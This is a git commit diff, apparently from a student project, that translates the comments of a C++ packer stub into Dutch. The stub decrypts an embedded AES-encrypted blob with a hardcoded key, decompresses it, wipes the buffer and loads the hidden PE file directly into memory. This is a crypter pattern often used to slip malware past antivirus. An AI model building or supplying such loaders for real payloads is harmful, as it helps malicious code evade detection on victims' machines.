035853d24cc328b46cc7aa6a855abf0487d0e9c5
Josh Witteveen <16086651@student.hhs.nl>
2023-05-30 18:56:09 +0200

    Stub comments toegevoegd

--- Lowkey_stub/stub.cpp
+++ Lowkey_stub/stub.cpp
@@ -1,47 +1,42 @@
 #include <Windows.h>
 
-// WinAPI Functions
-#include <Windows.h>
-
-// Resolvers Functions
+//Resolvers
 extern "C" void crt_init();
 extern "C" void k32_init();
 
-// Encryption Library
+//Ecryptie library
 extern "C"
 {
 #include "aes.h"
 }
 
-// Compression Library
+//Compressie library
 #include "lzma2\fast-lzma2.h"
 
-// PE Loader Library
+//PE loader/mapper
 #include "mmLoader.h"
 
-// Merge Data With Code
+//Data in de code sectie voegen
 #pragma comment(linker, "/merge:.rdata=.text")
 #pragma comment(linker, "/merge:.data=.text")
 
 
-
-// Entrypoint
 void func_unpack()
 {
-	// Internal Data [ Signatures ]
+	//Singatures die overschreden worden door Packer
 	volatile PVOID data_ptr = (void*)0xAABBCCDD;
 	volatile DWORD data_size = 0xEEFFAADD;
 	volatile DWORD actual_data_size = 0xA0B0C0D0;
 	volatile DWORD header_size = 0xF0E0D0A0;
 
-	// Initializing Resolvers
+	//Resolvers
 	k32_init(); crt_init();
 
-	// Getting BaseAddress of Module
+	//Base adress van huidige programma
 	intptr_t imageBase = (intptr_t)GetModuleHandleA(0);
 	data_ptr = (void*)((intptr_t)data_ptr + imageBase);
 
-	// Initializing Cryptor
+	//Intialisatie encryptie
 	struct AES_ctx ctx;
 	const unsigned char key[32] = {
 	0xD6, 0x23, 0xB8, 0xEF, 0x62, 0x26, 0xCE, 0xC3, 0xE2, 0x4C, 0x55, 0x12,
@@ -54,20 +49,19 @@ void func_unpack()
 	};
 	AES_init_ctx_iv(&ctx, key, iv);
 
-	// Casting PVOID to BYTE
 	uint8_t* data_ptr_byte = (uint8_t*)data_ptr;
 
-	// Decrypting Buffer
+	//Decrypting
 	AES_CBC_decrypt_buffer(&ctx, data_ptr_byte, data_size);
 
-	// Allocating Code Buffer
+	//Code buffer aanmaken in memory
 	uint8_t* code_buffer = (uint8_t*)malloc(actual_data_size);
 
-	// Decompressing Buffer
+	//Decompressen van buffer
 	FL2_decompress(code_buffer, actual_data_size, &data_ptr_byte[16], data_size - 32);
 	memset(data_ptr, 0, data_size);
 
-	// Loading PE File
+	//Laden PE bestand
 	DWORD pe_loader_result = 0;
 	HMEMMODULE pe_module = LoadMemModule(code_buffer, true, &pe_loader_result);
 }
